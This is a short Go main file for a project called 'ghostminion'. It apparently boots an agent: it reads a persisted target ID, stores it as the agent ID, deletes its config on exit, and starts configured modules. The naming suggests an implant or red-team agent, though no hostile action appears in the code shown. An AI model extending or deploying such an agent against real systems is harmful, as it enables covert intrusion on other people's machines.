package main

import (
	"ghostminion/apps"
	"ghostminion/config"
	"ghostminion/core"
	"ghostminion/db"
	"ghostminion/logger"
	"ghostminion/persistence"
)

func main() {

	var cfg = config.GetInstance()
	db.GetInstance()
	var lgr = logger.GetInstance()

	defer config.DeleteConfig()
	defer lgr.Close()

	targetId := persistence.GeTargetID()
	err := cfg.Update(func(c *config.Config) {
		c.AgentID = targetId
	})
	if err != nil {
		lgr.Error("Error updating agent ID: " + err.Error())
	}
	
	appCore := core.GetInstance()
	RegisterDefaultApps(appCore, cfg)
	appCore.Start() // todo: should run security here
}

func RegisterDefaultApps(core *core.Core, cfg *config.Config) {
	am := core.AppsManager()
	for _, appConfig := range cfg.Apps {
		app, err := apps.NewAppFactory(apps.AppData{
			Id:     appConfig.Id,
			Name:   appConfig.Name,
			Type:   apps.AppType(appConfig.Type),
			Params: appConfig.Params,
		})
		if err != nil {
			return
		}
		am.Register(app)
	}
}
